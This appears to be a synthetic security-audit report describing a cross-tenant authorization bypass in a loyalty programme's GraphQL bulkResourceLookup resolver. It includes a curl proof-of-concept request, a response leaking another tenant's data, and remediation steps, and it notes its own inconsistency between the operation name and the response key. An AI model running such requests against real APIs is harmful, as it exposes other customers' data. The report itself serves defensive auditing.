# Security Analysis Report
**System:** RewardCore Loyalty API
**Domain:** Retail / Loyalty Programme
**Example ID:** GQL-0323
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.1 | Authorization-bypass injection via `bulkResourceLookup` — attacker injects cross-tenant loyalty record IDs into bulk lookup, bypassing per-ID ownership checks |

---

## Finding 1 — Injection: Authorization-Bypass Injection (Pattern 5.1)

### Summary
The `bulkResourceLookup` mutation on RewardCore Loyalty API (`api.rewardcore-loyalty-a.example.com`) accepts an arbitrary array of resource IDs without per-ID ownership filtering. Per §5.0 Pattern 5.1, the resolver's lack of per-ID tenancy validation is an injection vulnerability — an attacker with `tenant-770d` credentials injects victim `tenant-855b` resource IDs (`R-2323`, `R-1323`, `R-3323`) into the bulk lookup payload, receiving loyalty record data belonging to `tenant-855b`.

**Context.txt inconsistency (documented):** HAR mutation body uses `bulkResourceLookup(ids: [...])`, but the response JSON key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`bulkResourceLookup`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of loyalty records.

**Pattern:** 5.1 — Authorization-bypass injection (Injection)
**Affected resolver:** `bulkResourceLookup`
**Affected endpoint:** `POST https://api.rewardcore-loyalty-a.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.rewardcore-loyalty-a.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-770d

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2323\", \"R-1323\", \"R-3323\"]) { resourceId tenantId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Loyalty Record Data Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-855b",
      "ownerId": "other-user-770d855b",
      "data": {
        "sensitiveField": "CONFIDENTIAL-770d855b",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-770d`. Returned data belongs to: `tenant-855b`. Cross-tenant loyalty data exposure confirmed via injected bulk ID list.

**Context.txt inconsistency:** HAR sends `bulkResourceLookup` mutation; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.rewardcore-loyalty-a.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-770d" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2323\", \"R-1323\", \"R-3323\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: response contains tenant-855b loyalty data — cross-tenant injection succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch on one or more IDs"}]}
```

### Remediation
1. In `bulkResourceLookup` resolver: after fetching each record by ID, verify each record's `tenantId` matches the JWT's `tenantId`. Silently exclude or explicitly reject cross-tenant IDs.
2. Consider removing `bulkResourceLookup` from the public schema or restricting it to internal/privileged callers only.
3. Re-key Redis cache to include `tenantId`.
